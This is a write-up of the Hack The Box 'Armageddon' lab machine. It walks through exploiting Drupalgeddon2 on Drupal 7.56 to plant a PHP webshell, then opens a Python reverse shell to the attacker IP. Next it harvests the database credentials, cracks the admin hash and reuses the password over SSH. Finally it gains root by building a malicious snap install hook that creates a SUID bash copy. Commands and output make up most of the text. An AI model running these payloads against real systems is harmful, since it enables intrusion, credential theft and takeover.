# HTB Armageddon — Writeup

**Target IP:** 10.129.48.89
**Attacker IP (Kali):** 10.10.15.146
**Difficulty:** Easy
**OS:** CentOS (Linux, SELinux enabled)

---

## 1. Reconnaissance

```bash
/usr/lib/nmap/nmap -sCV -T4 -p22,80 -oA nmap/nmap 10.129.48.89
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to  Armageddon |  Armageddon
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
```

Key finding: `http-generator: Drupal 7`, confirmed by the robots.txt disallow entries, which are the standard Drupal 7 install paths.

---

## 2. Identifying the Vulnerability

```bash
searchsploit drupal 7.56
```

```
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                          | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                       | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                               | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                           | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                  | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)             | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                    | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                                | php/webapps/46459.py
------------------------------------------------------------------------------------------------------------------ ---------------------------------
```

Went with **Drupalgeddon2** (`44449.rb`), a pre-authentication RCE affecting Drupal 7.x below 7.58.

---

## 3. Exploitation — Drupalgeddon2 (RCE)

```bash
gem install highline
```

```
Fetching highline-3.1.2.gem
Successfully installed highline-3.1.2
Parsing documentation for highline-3.1.2
Installing ri documentation for highline-3.1.2
Done installing documentation for highline after 3 seconds
1 gem installed
```

```bash
ruby exploit.rb http://10.129.48.89 --verbose
```

```
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.129.48.89/
--------------------------------------------------------------------------------
[v] HTTP - URL : http://10.129.48.89/CHANGELOG.txt
[v] HTTP - Type: get
[+] Found  : http://10.129.48.89/CHANGELOG.txt    (HTTP Response: 200)    [HTTP Size: 8]
[+] Drupal!: v7.56
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo PGJYPYJW
[v] HTTP - URL : http://10.129.48.89/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo PGJYPYJW
[v] HTTP - Type: post
[v] HTTP - Data: form_id=user_pass&_triggering_element_name=name
[+] Result : PGJYPYJW
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.129.48.89/shell.php)
[i] Response: HTTP 404 // Size: 5
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://10.129.48.89/shell.php' -d 'c=hostname'
armageddon.htb>> whoami
apache
armageddon.htb>> python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.146",4444));subprocess.call(["/bin/bash","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

The exploit confirmed the exact version (`v7.56`) via `CHANGELOG.txt`, then used the `user/password` form's `#post_render` callback to inject a `passthru()` call, proving code execution by echoing back `PGJYPYJW`. It then wrote a PHP webshell to the web root:

```php
<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
```

Confirmed shell access as `apache`, then used the webshell's `c` parameter to fire a Python reverse shell back to a listener.

### Catching the reverse shell

```bash
nc -lvnp 4444
```

```
listening on [any] 4444 ...
connect to [10.10.15.146] from (UNKNOWN) [10.129.48.89] 54826
bash: no job control in this shell
bash-4.2$ whoami
whoami
apache
```

Landed an interactive-ish shell as `apache`.

---

## 4. Privilege Escalation: apache → brucetherealadmin

```bash
cat settings.php
```

Full file is standard Drupal boilerplate/comments; the line that matters:

```php
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

Used the leaked DB credentials to dump the Drupal `users` table directly:

```bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; select * from users;'
```

```
uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language        picture     init    data
0                                               NULL    0       0       0       0       NULL            0               NULL
1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu                     filtered_html   1606998756  1607077194      1607076276      1       Europe/London           0       admin@armageddon.eu     a:1:{s:7:"overlay";i:1;}
```

Grabbed the `brucetherealadmin` hash (`$S$...`, Drupal 7's SHA-512 based format) and cracked it with John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
booboo           (?)     
1g 0:00:00:01 DONE (2026-08-03 15:06) 0.5847g/s 135.6p/s 135.6c/s 135.6C/s tiffany..harley
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

**Cracked instantly:** `booboo`

The password was reused for the OS-level account — confirmed via SSH:

```bash
ssh brucetherealadmin@10.129.48.89
```

```
Warning: Permanently added '10.129.48.89' (ED25519) to the list of known hosts.
brucetherealadmin@10.129.48.89's password: 
Last login: Tue Mar 23 12:40:36 2021 from 10.10.14.2
[brucetherealadmin@armageddon ~]$ whoami
brucetherealadmin
```

Landed a shell as `brucetherealadmin` and grabbed `user.txt`.

---

## 5. Privilege Escalation: brucetherealadmin → root

```bash
sudo -l
```

```
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

This is the well-documented **Armageddon `snap install` privesc**: since `snap` runs a package's install hook as root during installation, a maliciously-crafted `.snap` file gives root code execution, no password required.

### Dead end #1: no `gem`/`fpm` on target, no internet on target

The standard GTFOBins technique builds the `.snap` using `fpm` (installed via Ruby gem) directly on the target. Neither was available:

```bash
[brucetherealadmin@armageddon tmp]$ wget http://10.10.15.146:8000/sneaky.snap
-bash: wget: command not found
[brucetherealadmin@armageddon tmp]$ which curl
/usr/bin/curl
```

No `wget`, but `curl` was present — confirmed files could still be pulled in from an attacker-hosted HTTP server. And since the target had no outbound internet access at all, `gem`/`fpm` couldn't be installed there either.

**Fix:** build the `.snap` entirely on Kali (which has internet access) using `mksquashfs` directly — no `fpm`/`gem` dependency — then serve it and pull it over with `curl`.

### Building the malicious snap (on Kali)

```bash
mkdir -p sneaky-snap/meta/hooks
cd sneaky-snap

cat > meta/snap.yaml << 'EOF'
name: sneaky
version: 0.1
summary: sneaky
description: sneaky
confinement: devmode
grade: devel
EOF

cat > meta/hooks/install << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x meta/hooks/install

mksquashfs . ../sneaky.snap -noappend -comp xz -no-fragments -no-progress
```

### Dead end #2: read-only root filesystem

```bash
[brucetherealadmin@armageddon tmp]$ sudo /usr/bin/snap install --dangerous --devmode sneaky.snap
Run install hook of "sneaky" snap if present                                                                                                       \
error: cannot perform the following tasks:
- Run install hook of "sneaky" snap if present (run hook "install": chmod: changing permissions of '/bin/bash': Read-only file system)
[brucetherealadmin@armageddon tmp]$ /bin/bash -p
[brucetherealadmin@armageddon tmp]$
```

**Confirmed cause:** the hook *did* run as root, but `/bin/bash` sits on a read-only mounted filesystem, so `chmod +s` on it can never succeed. `/bin/bash -p` afterward stayed unprivileged, confirming nothing was actually set.

**Fix:** stop touching the real `/bin/bash` — copy it to a writable location and set the SUID bit on the copy instead.

### Dead end #3: payload "succeeded" but the file never appeared

Rebuilt the hook to target `/tmp`:

```bash
cat > meta/hooks/install << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
```

```bash
[brucetherealadmin@armageddon tmp]$ sudo /usr/bin/snap install --dangerous --devmode sneaky2.snap
sneaky 0.1 installed
[brucetherealadmin@armageddon tmp]$ ls -la /tmp/rootbash
ls: cannot access /tmp/rootbash: No such file or directory
[brucetherealadmin@armageddon tmp]$ /tmp/rootbash -p
-bash: /tmp/rootbash: No such file or directory
```

No error this time — install reported success — but the file was nowhere to be found. Checked `id` and `/tmp` on target for clues:

```bash
[brucetherealadmin@armageddon tmp]$ id
uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

```bash
[brucetherealadmin@armageddon tmp]$ ls
systemd-private-396e319e856345ee94f532c81b76d0b2-httpd.service-qyd61v    vmware-root_680-2689143817
systemd-private-396e319e856345ee94f532c81b76d0b2-mariadb.service-RYkDaH  vmware-root_681-4022243287
```

**Confirmed cause:** the `systemd-private-*` directories in `/tmp` show that services on this box run with `PrivateTmp=yes`. Since `snapd` (and by extension the install hook it spawns) can run inside its own private `/tmp` mount namespace, whatever the hook wrote to `/tmp` was invisible to the interactive shell's `/tmp` — the install "succeeded" but the artifact landed somewhere we couldn't see. (SELinux was also confirmed enforcing at this point via `sestatus`, but it turned out not to be the actual blocker — `/tmp` namespace isolation was.)

**Fix:** point the payload at a location that isn't subject to per-service namespace isolation — the user's home directory — which is writable by root and shared across all namespaces.

### Final working payload

```bash
cat > meta/hooks/install << 'EOF'
#!/bin/bash
cp /bin/bash /home/brucetherealadmin/rootbash
chmod +s /home/brucetherealadmin/rootbash
EOF
chmod +x meta/hooks/install

mksquashfs sneaky-snap sneaky3.snap -noappend -comp xz -no-fragments -no-progress
```

### Transfer and execution (on target)

```bash
[brucetherealadmin@armageddon tmp]$ curl -O http://10.10.15.146:8000/sneaky3.snap
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4096  100  4096    0     0   6583      0 --:--:-- --:--:-- --:--:--  6627
[brucetherealadmin@armageddon tmp]$ sudo /usr/bin/snap install --dangerous --devmode sneaky3.snap
sneaky 0.1 installed
[brucetherealadmin@armageddon tmp]$ ls -la /home/brucetherealadmin/rootbash
-rwsr-sr-x. 1 root root 1037528 Aug  3 16:45 /home/brucetherealadmin/rootbash
[brucetherealadmin@armageddon tmp]$ /home/brucetherealadmin/rootbash -p
/home/brucetherealadmin/rootbash: /lib64/libtinfo.so.5: no version information available (required by /home/brucetherealadmin/rootbash)
rootbash-4.3# id
uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) euid=0(root) egid=0(root) groups=0(root),1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
rootbash-4.3# cd /root
rootbash-4.3# ls
anaconda-ks.cfg  cleanup.sh  passwd  reset.sh  root.txt  snap
rootbash-4.3# cat root.txt
```

`euid=0(root)` confirms root. The `libtinfo.so.5` warning is just a harmless Kali/target library version mismatch on the copied bash binary.

**Root achieved.**

---

## 6. Summary of the Attack Chain

| Stage | Technique | Result |
|-------|-----------|--------|
| Recon | Nmap + Drupal robots.txt/changelog | Identified Drupal 7.56 |
| Initial Access | Drupalgeddon2 (CVE-2018-7600) | RCE as `apache` |
| Lateral Movement | `settings.php` DB creds → Drupal `users` table → John (Drupal7 hash format) | Cracked password `booboo`, reused for SSH as `brucetherealadmin` |
| Privesc | `sudo snap install` GTFOBins technique, built with `mksquashfs` (no fpm/gem needed) | Root shell via SUID bash copy in home dir |

### Key lessons

- Drupal's `CHANGELOG.txt` reliably leaks exact version numbers — always check it first.
- Drupal DB credentials in `settings.php` are a goldmine, since the `users` table often contains the only real system account, and Drupal7-hash password reuse across web and OS accounts is common on easy boxes.
- GTFOBins' documented technique for a binary can assume tooling (`fpm`, `gem`) that isn't present on target — the underlying primitive (a snap install hook running as root) can be reproduced with just `mksquashfs`, which is far more likely to be available, and built entirely on the attacker box.
- Hardened targets can stack multiple obstacles — here, both a **read-only root filesystem** and **PrivateTmp-isolated services**. When a "should have worked" exploit reports success but leaves no visible artifact, check for private mount namespaces before assuming the technique itself is broken or blaming SELinux.
